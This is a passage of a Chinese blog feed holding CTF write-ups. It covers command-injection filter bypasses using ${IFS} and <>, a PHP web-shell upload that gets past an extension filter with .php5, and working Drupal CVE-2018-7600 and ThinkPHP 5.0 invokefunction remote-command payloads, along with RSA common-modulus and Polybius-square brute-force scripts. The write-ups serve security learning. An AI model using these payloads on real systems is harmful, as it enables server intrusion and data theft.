和新行)</strong></p><p><img src="https://s2.ax1x.com/2019/01/19/kCtlYq.md.png" alt="kCtlYq.md.png"></p><p>用<code>${IFS}</code>尝试绕过，输入<code>ls${IFS}/</code>,发现回显中有flag信息：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCto1f.png" alt="kCto1f.png"></p><p>直接<code>cat${IFS}/ffLAG_404</code>得到flag：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCtbng.png" alt="kCtbng.png"></p><p>事后想查看admin.php和config.php的内容，发现<code>${IFS}</code>无效，于是尝试<code>&lt;&gt;</code>成功，直接<code>cat&lt;&gt;admin.php和config.php</code>即可；</p><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">$retval = <span class="keyword">array</span>();</span><br><span class="line">exec($cmd, $retval, $status);</span><br><span class="line"><span class="comment">// var_dump($retval);</span></span><br><span class="line"><span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">'error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现确实用<code>waf_exec()</code>函数过滤了<code>空格，&gt;，{，}</code>等一系列符号，但是没有过滤<code>&lt; / $</code>，所以可以直接用<code>&lt;和$IFS</code>绕过即可；</p><p>参考链接：<a href="http://www.k0rz3n.com/2017/07/30/cookie/#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8Ccookie-%E6%AC%BA%E9%AA%97" target="_blank" rel="noopener">cookie欺骗</a>，<a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="noopener">命令执行的绕过技巧</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="juju"><a href="#juju" class="headerlink" title="juju"></a>juju</h3><p>拿到图片丢进16进制编辑器，查找flag无果，发现是png图片就查看一下文件头，发现貌似没什么问题，看到图片的高度和长度不一样，于是都改成04，图片的下一截显现出来：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCN7P1.png" alt="kCN7P1.png"></p><p>得到的编码为base32，直接解码md5一下即可</p><p><img src="https://s2.ax1x.com/2019/01/19/kCNfrF.png" alt="kCNfrF.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;萌新因为种种原因没有做安恒12月的月赛题，正巧这几天发现复现，又学到了新知识！
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMT-CTF第一次双月赛Writeup</title>
    <link href="https://gardenia30.top/2019/01/14/CUMT-CTF%E5%8F%8C%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>https://gardenia30.top/2019/01/14/CUMT-CTF双月赛Writeup/</id>
    <published>2019-01-14T07:01:43.000Z</published>
    <updated>2019-01-16T14:56:13.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知其然，知其所以然<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>题目描述是可以上传图片的，就随手上传一张图片上去<br><img src="https://s1.ax1x.com/2018/12/16/FdJD6P.png" alt=""></p><p>回显出目录结构如下：<br><img src="https://s1.ax1x.com/2018/12/16/FdJym8.png" alt=""></p><p>访问URL发现可以看到上传的图片：<br><img src="https://s1.ax1x.com/2018/12/16/FdNWfH.png" alt=""><br>知道了上传目录，现在要做的就是上传成功一个Web Shell。</p><p>连接Cknife，写了个php小马，上传发现不可以上传以php结尾的文件。</p><p>第一次抓包尝试加00截断，未果。</p><p>第二次将后缀改成1.php.abc可以成功上传，但是设置Cknife需要连接的时候发现connection：close，应该是不能将上传的1.php.abc成功解析,未果。</p><p>第三次将后缀改成php5，可以上传成功，连接Cknife，成功进入，应该这次可以将haha.php5成功解析：<br><img src="https://s1.ax1x.com/2018/12/16/Fdd9FU.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdaxe0.png" alt=""></p><p>在upload文件夹中找了半天，全都是别人上传的文件，最后在根目录发现了flag：<br><img src="https://s1.ax1x.com/2018/12/16/FddrXn.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdw8CF.png" alt=""></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>hint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞。</p><p>Google一波，看看大佬写的博客，贴个链接：</p><p><a href="https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-" target="_blank" rel="noopener">https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-</a></p><p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p><p>先创建账号，发现不可以发送email，Google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候直接拿bp截断，构造post：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure><p>这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWuDO.png" alt=""></p><p>保留这个form_build_id，用Hackbar post一下这个form_build_id，如下图：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdW2rT.png" alt=""></p><p>抓包截断，go一下回显根目录，发现flag文件，</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWsGn.png" alt=""></p><p>下一步就是尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成<code>cat%20/flag</code>即可。（需要注意的是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据）</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWECR.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/12/16/FdWiE4.png" alt=""></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>是个新题正好是前段时间爆出来的新漏洞：ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞，前些日子看合天公众号推送了一篇类似的文章正好派上用场：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652849500&amp;idx=1&amp;sn=faf67baccbc970a179e679ea378fdc92&amp;chksm=bd5939918a2eb087cd34eff02f4bb0186190f15dda841e299923717de222df913db1a89acb1d&amp;mpshare=1&amp;scene=23&amp;srcid=1216eedEBA61VyEXXfPPHC1R#rd" target="_blank" rel="noopener">click here</a></p><p>题目提示是tp5.0版本，文章直接有payload：</p><p><code>命令执行：</code></p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</code></p><p>先<code>ls /</code>列出根目录下的所有目录，发现flag文件；</p><p><a href="https://imgchr.com/i/Fxggu6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/14/Fxggu6.md.png" alt="Fxggu6.md.png"></a></p><p>然后直接查看flag文件即可：</p><p><img src="https://s2.ax1x.com/2019/01/14/FxgqDf.png" alt="FxgqDf.png"></p><p>payload:</p><p><code>http://219.219.61.234:10005/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>之前还没有认真学习过密码学的东西，好在期末好好复习了密码学，现在已经对密码学的知识有了个初步的认识，来温习一下上次的crypto</p><h3 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h3><p>拿到这题，看到<code>n,c1,c2,e1,e2</code>基本已经锁定这一题就是RSA的共模攻击，但是所给的参数全部都是字母，按理说应该都是数字才对，所以最难的工作就是将这一堆的字母转化为可用的数字；</p><p>先统计一下字母的出现频率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_each_char_1</span><span class="params">(string)</span>:</span></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            res[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res[i] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"n:"</span>+str((count_each_char_1(n)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1:"</span>+str((count_each_char_1(c1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2:"</span>+str((count_each_char_1(c2)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1:"</span>+str((count_each_char_1(e1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2:"</span>+str((count_each_char_1(e2)))</span><br></pre></td></tr></table></figure><p><strong>Result</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n:&#123;&apos;A&apos;: 65, &apos;B&apos;: 63, &apos;E&apos;: 56, &apos;g&apos;: 52, &apos;I&apos;: 60, &apos;O&apos;: 72, &apos;S&apos;: 56, &apos;b&apos;: 62, &apos;T&apos;: 69, &apos;Z&apos;: 62&#125;</span><br><span class="line">c1:&#123;&apos;A&apos;: 55, &apos;b&apos;: 62, &apos;E&apos;: 66, &apos;g&apos;: 60, &apos;I&apos;: 67, &apos;O&apos;: 58, &apos;S&apos;: 65, &apos;B&apos;: 59, &apos;T&apos;: 53, &apos;Z&apos;: 72&#125;</span><br><span class="line">c2:&#123;&apos;A&apos;: 67, &apos;B&apos;: 61, &apos;E&apos;: 51, &apos;g&apos;: 60, &apos;I&apos;: 57, &apos;O&apos;: 63, &apos;S&apos;: 66, &apos;b&apos;: 63, &apos;T&apos;: 70, &apos;Z&apos;: 59&#125;</span><br><span class="line">e1:&#123;&apos;I&apos;: 3, &apos;Z&apos;: 1, &apos;B&apos;: 2, &apos;T&apos;: 1, &apos;g&apos;: 1&#125;</span><br><span class="line">e2:&#123;&apos;A&apos;: 1, &apos;b&apos;: 1, &apos;g&apos;: 2, &apos;I&apos;: 1, &apos;T&apos;: 1, &apos;Z&apos;: 1&#125;</span><br></pre></td></tr></table></figure><p>发现总共就出现了10个字母<code>A,B,E,g,I,O,S,b,T,Z</code>,猜想这10个字母对应的是0-9的10个数字，如何将字母和数字进行对应是个头疼的问题；想了半天，没办法，只能暴力破解，产生字母的全排列对应10个数字…</p><p><strong>暴力破解脚本</strong>(借鉴队友脚本学习了一下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">dic_alp1=[<span class="string">'O'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'b'</span>,<span class="string">'Z'</span>,<span class="string">'I'</span>,<span class="string">'E'</span>,<span class="string">'S'</span>,<span class="string">'g'</span>]</span><br><span class="line">dic_num=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">dic_alp2=list(itertools.permutations(dic_alp1))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_alp2:</span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">n=n.replace(x[i],dic_num[i])</span><br><span class="line">c1=c1.replace(x[i],dic_num[i])</span><br><span class="line">c2=c2.replace(x[i],dic_num[i])</span><br><span class="line">e1=e1.replace(x[i],dic_num[i])</span><br><span class="line">e2=e2.replace(x[i],dic_num[i])</span><br><span class="line"></span><br><span class="line">n=int(n,<span class="number">10</span>)</span><br><span class="line">c1=int(c1,<span class="number">10</span>)</span><br><span class="line">c2=int(c2,<span class="number">10</span>)</span><br><span class="line">e1=int(e1,<span class="number">10</span>)</span><br><span class="line">e2=int(e2,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> gmpy2.gcd(e1,e2)!=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mgcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=-s</span><br><span class="line">c1=gmpy2.invert(c1,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">t=-t</span><br><span class="line">c2=gmpy2.invert(c2,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">plain=pow(c1,s,n)*pow(c2,t,n)%n</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ans = <span class="string">'&#123;:x&#125;'</span>.format(plain).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>先用出现字母的全排列对应表0-9这10个数，然后将所有参数用数字表示，用RSA的共模攻击求出最后的结果，发现flag：</p><p><a href="https://imgchr.com/i/kS6qQ1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/16/kS6qQ1.md.png" alt="kS6qQ1.md.png"></a></p><p>最后发现是与数字形状相似的字母代替数字产生的参数…… </p><p><strong>attention：</strong>其实可以对脚本进行优化，因为<code>e1</code>和<code>e2</code>都是和<code>φ(n)</code>互素的，所以<code>e1</code>和<code>e2</code>都是奇数，所以可以缩小<code>e1</code>和<code>e2</code>的范围，最后一个数字都是奇数，即：<code>g</code>和<code>I</code>都是奇数；</p><h3 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h3><p>这题直接告诉是棋盘密码，比较简单，给出的密文里总共有<code>ksynb</code>5个字母，所以直接构造这5个字母的全排列对应26字母表即可，总共有5!=120种不同的结果，可以直接暴破；</p><p><strong>暴力破解脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line">cipher=<span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line">dic_cip=list(itertools.permutations(<span class="string">"ksynb"</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_cip:</span><br><span class="line">    key.append(<span class="string">''</span>.join(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child_key <span class="keyword">in</span> key:</span><br><span class="line">    num_c=<span class="string">""</span></span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        num_c+=str(child_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(num_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii=int(num_c[i])*<span class="number">5</span>+int(num_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">"i"</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        ans+=chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> child_key,ans</span><br></pre></td></tr></table></figure><p>发现有两种结果里面有<code>flag</code>字符，显然是第一个，排列方式为<code>skynb</code>；</p><p><img src="https://s2.ax1x.com/2019/01/16/kS4Yuj.png" alt="kS4Yuj.png"></p><h3 id="First-level"><a href="#First-level" class="headerlink" title="First level"></a>First level</h3><p>题目给出<code>e=2</code>，基本已经锁定是RSA的衍生算法rabin，yafu分解n得到p和q如下：</p><figure class="highlight 